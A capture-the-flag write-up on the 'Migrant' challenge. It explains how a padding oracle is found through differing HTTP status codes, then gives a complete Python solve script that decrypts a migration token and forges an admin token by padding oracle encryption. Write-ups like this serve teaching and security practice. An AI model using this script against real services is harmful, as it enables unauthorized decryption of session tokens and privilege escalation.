# CTF Write-up: Migrant

## Challenge Overview

**Category:** Web / Crypto
**Objective:** Exploit the token migration process to elevate privileges to the `admin` role and retrieve the flag.

In this challenge, players are presented with a "Platform v2 Migration" portal. Because the source code is not provided initially, this requires a black-box analysis of how the application handles the provided migration tokens. The challenge combines web enumeration with a classic cryptographic vulnerability.

---

## Step 1: Reconnaissance

Upon visiting the main page, the application provides a "V1 Migration Token" for a standard user. The token is a long, Base64-encoded string.

Clicking the "Migrate Account" button triggers a POST request to `/api/migrate` with the token in a JSON payload: `{"token": "<base64_string>"}`.

If you decode the Base64 string, you get a raw byte array. The length of this byte array is a multiple of 16, which strongly suggests the use of a block cipher like AES (likely with a 16-byte block size), where the first 16 bytes act as the Initialization Vector (IV) and the rest is the ciphertext.

---

## Step 2: Identifying the Vulnerability (Black-Box)

The core of the challenge is discovered by fuzzing the ciphertext and observing the server's HTTP response codes. This reveals an information leak regarding the cryptographic padding.

1. **Valid Token:** Submitting the unmodified token results in an HTTP `200 OK` (Migration successful).
2. **Invalid Padding:** If you intercept the request and randomly alter the last few bytes of the decoded ciphertext, the server responds with an HTTP `500 Internal Server Error`.
3. **Invalid Plaintext / Valid Padding:** If you carefully manipulate the ciphertext blocks so that the underlying decryption results in valid PKCS#7 padding but garbage plaintext (breaking the JSON structure), the server responds with an HTTP `400 Bad Request`.

This differential response between HTTP 500 (Invalid Padding) and HTTP 400/200 (Valid Padding) creates a classic **Padding Oracle**. The server is inadvertently telling us whether our guessed padding is correct after decryption.

---

## Step 3: The Padding Oracle Attack (POA)

A padding oracle allows an attacker to decrypt the ciphertext and encrypt arbitrary data without ever knowing the server's secret key.

### Decrypting the Target

Using a standard padding oracle decryption script (which guesses byte by byte from the end of the block, looking for the HTTP 400 response to confirm valid padding), we can decrypt the provided starter token.

The decryption reveals the underlying JSON structure:

```json
{"user":"guest", "role":"user", "v":"1.0"}

```

### Forging the Admin Token

To get the flag, we need the server to process a token where the role is set to `admin`:

```json
{"user":"guest", "role":"admin", "v":"1.0"}

```

Because we have a padding oracle, we aren't limited to just decryption. We can use a technique often called "Padding Oracle Encryption" (or CBC-R) to forge a valid ciphertext for our new JSON payload.

The encryption attack works backward:

1. We start with a random block of ciphertext.
2. We use the padding oracle to find the intermediate state (the state after AES decryption but before the XOR with the previous ciphertext block).
3. We XOR this intermediate state with our desired plaintext block to calculate what the *previous* ciphertext block must be.
4. We repeat this process from the last block to the first, eventually generating a forged IV.

---

## Step 4: Execution

The provided solve script automates this entire process:

1. **Persistent Connection:** The script uses a custom `KeepAliveClient` to maintain a single TCP connection. Padding oracle attacks require thousands of HTTP requests; avoiding the overhead of establishing a new connection for every request makes the attack significantly faster.
2. **Oracle Definition:** The `padding_oracle` function returns `True` if the response is not a 500 error (meaning the padding was valid).
3. **Deriving the Intermediate State:** The `get_intermediate` function isolates a single block and guesses bytes until the oracle confirms valid padding, dealing with false positives by flipping guard bytes.
4. **Encryption:** The `poa_encrypt` function implements the backward-forging technique to create a valid IV and ciphertext from the target `{"user":"guest", "role":"admin", "v":"1.0"}` payload.

By running the script below, the attacker generates the forged token, submits it to `/api/migrate`, and successfully bypasses the authentication check to retrieve the flag:

```py
import socket
import base64
import json
import os
import re
import threading
from urllib.parse import urlparse
from Crypto.Util.Padding import pad
from Crypto.Util.strxor import strxor

TARGET = "<TARGET_URL>"  # Replace with the actual target URL
BLOCK_SIZE = 16

_parsed = urlparse(TARGET)
HOST = _parsed.hostname
PORT = _parsed.port or 80
BASE_PATH = _parsed.path if _parsed.path else "/"

class KeepAliveClient:
    """
    Minimal HTTP/1.1 client over a single persistent TCP socket.
    Avoids per-request connection setup, which dominates cost when
    the oracle needs 256 * 16 * n_blocks queries.
    """

    def __init__(self, host: str, port: int, timeout: float = 10.0):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock = None
        self.lock = threading.Lock()
        self._connect()

    def _connect(self):
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass
        self.sock = socket.create_connection((self.host, self.port), timeout=self.timeout)

    def _recv_until(self, buf: bytes, marker: bytes) -> bytes:
        while marker not in buf:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise ConnectionError("socket closed while waiting for data")
            buf += chunk
        return buf

    def _read_response(self):
        buf = self._recv_until(b"", b"\r\n\r\n")
        header_data, _, body = buf.partition(b"\r\n\r\n")
        lines = header_data.decode(errors="replace").split("\r\n")
        status_code = int(lines[0].split(" ", 2)[1])

        headers = {}
        for line in lines[1:]:
            if ": " in line:
                k, v = line.split(": ", 1)
                headers[k.strip().lower()] = v.strip()

        if headers.get("transfer-encoding", "").lower() == "chunked":
            body = self._read_chunked(body)
        else:
            content_length = int(headers.get("content-length", "0"))
            while len(body) < content_length:
                chunk = self.sock.recv(4096)
                if not chunk:
                    break
                body += chunk
            body = body[:content_length]

        # Non-persistent servers signal close via this header
        if headers.get("connection", "").lower() == "close":
            self._connect()

        return status_code, headers, body

    def _read_chunked(self, buf: bytes) -> bytes:
        body = b""
        while True:
            buf = self._recv_until(buf, b"\r\n")
            size_line, _, buf = buf.partition(b"\r\n")
            size = int(size_line.split(b";")[0].strip(), 16)
            if size == 0:
                buf = self._recv_until(buf, b"\r\n\r\n") if b"\r\n\r\n" not in buf else buf
                break
            while len(buf) < size + 2:
                chunk = self.sock.recv(4096)
                if not chunk:
                    break
                buf += chunk
            body += buf[:size]
            buf = buf[size + 2:]
        return body

    def request(self, method: str, path: str, json_body: dict = None, retries: int = 3):
        payload = json.dumps(json_body).encode() if json_body is not None else b""
        headers = (
            f"{method} {path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(payload)}\r\n"
            f"\r\n"
        ).encode()
        raw_request = headers + payload

        with self.lock:
            last_exc = None
            for attempt in range(retries):
                try:
                    self.sock.sendall(raw_request)
                    return self._read_response()
                except (BrokenPipeError, ConnectionResetError, OSError, ConnectionError) as e:
                    last_exc = e
                    self._connect()
            raise RuntimeError(f"request failed after {retries} attempts: {last_exc}")

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass


client = KeepAliveClient(HOST, PORT)

# ── Oracle ────────────────────────────────────────────────────────────────────
def padding_oracle(iv: bytes, ct: bytes) -> bool:
    token = base64.b64encode(iv + ct).decode()
    status, _, _ = client.request("POST", "/api/migrate", {"token": token})
    return status != 500

# ── Core primitives ───────────────────────────────────────────────────────────
def get_intermediate(ct_block: bytes) -> bytes:
    assert len(ct_block) == BLOCK_SIZE
    intermediate = bytearray(BLOCK_SIZE)

    for i in range(BLOCK_SIZE - 1, -1, -1):
        pad_val = BLOCK_SIZE - i
        found = False

        for c in range(256):
            crafted_iv = bytearray(BLOCK_SIZE)
            for k in range(i + 1, BLOCK_SIZE):
                crafted_iv[k] = intermediate[k] ^ pad_val
            crafted_iv[i] = c

            if padding_oracle(bytes(crafted_iv), ct_block):
                if i == BLOCK_SIZE - 1:
                    # False-positive guard: flip a byte before index i
                    guard_iv = bytearray(crafted_iv)
                    guard_pos = max(0, i - 2)
                    guard_iv[guard_pos] ^= 0x01
                    if not padding_oracle(bytes(guard_iv), ct_block):
                        continue
                intermediate[i] = c ^ pad_val
                found = True
                break

        if not found:
            raise RuntimeError(f"Oracle failed at byte index {i}")

    return bytes(intermediate)

def poa_decrypt(raw_token: bytes) -> bytes:
    """Decrypt a full IV+ciphertext blob via the padding oracle."""
    iv = raw_token[:BLOCK_SIZE]
    ct = raw_token[BLOCK_SIZE:]
    assert len(ct) % BLOCK_SIZE == 0

    ct_blocks = [ct[i:i + BLOCK_SIZE] for i in range(0, len(ct), BLOCK_SIZE)]
    prev = iv
    plaintext = b""

    for blk in ct_blocks:
        inter = get_intermediate(blk)
        plaintext += strxor(inter, prev)
        prev = blk

    pad_len = plaintext[-1]
    return plaintext[:-pad_len]

def poa_encrypt(plaintext: bytes) -> bytes:
    """
    Encrypt arbitrary plaintext via padding oracle encryption.
    Works backwards: pick random C_n, recover intermediates, derive each C_{i-1}.
    Returns IV + ciphertext.
    """
    padded = pad(plaintext, BLOCK_SIZE)
    pt_blocks = [padded[i:i + BLOCK_SIZE] for i in range(0, len(padded), BLOCK_SIZE)]
    n = len(pt_blocks)

    ct_blocks = [None] * n
    ct_blocks[-1] = os.urandom(BLOCK_SIZE)

    for i in range(n - 1, 0, -1):
        inter = get_intermediate(ct_blocks[i])
        ct_blocks[i - 1] = strxor(inter, pt_blocks[i])

    inter = get_intermediate(ct_blocks[0])
    iv = strxor(inter, pt_blocks[0])

    return iv + b"".join(ct_blocks)

# ── Attack ────────────────────────────────────────────────────────────────────
def get_starter_token() -> bytes:
    status, _, body = client.request("GET", BASE_PATH)
    text = body.decode(errors="replace")
    match = re.search(r'<code id="starterToken">([A-Za-z0-9+/=]+)</code>', text)
    if not match:
        raise RuntimeError("Could not find starter token in page")
    return base64.b64decode(match.group(1))

def main():
    print("[*] Fetching starter token...")
    raw = get_starter_token()
    print(f"[*] Raw token ({len(raw)} bytes): {raw.hex()}")

    print("\n[*] Decrypting starter token via padding oracle...")
    pt = poa_decrypt(raw)
    print(f"[+] Decrypted: {pt}")

    profile = json.loads(pt)
    print(f"[+] Profile: {profile}")

    profile["role"] = "admin"
    forged_pt = json.dumps(profile, separators=(",", ":")).encode()
    print(f"\n[*] Forging admin token for: {forged_pt}")

    print("[*] Encrypting via padding oracle...")
    forged_raw = poa_encrypt(forged_pt)
    forged_token = base64.b64encode(forged_raw).decode()
    print(f"[+] Forged token: {forged_token}")

    print("\n[*] Submitting forged token...")
    status, _, body = client.request("POST", "/api/migrate", {"token": forged_token})
    print(f"[+] Response ({status}): {body.decode(errors='replace')}")

    client.close()

if __name__ == "__main__":
    main()
```
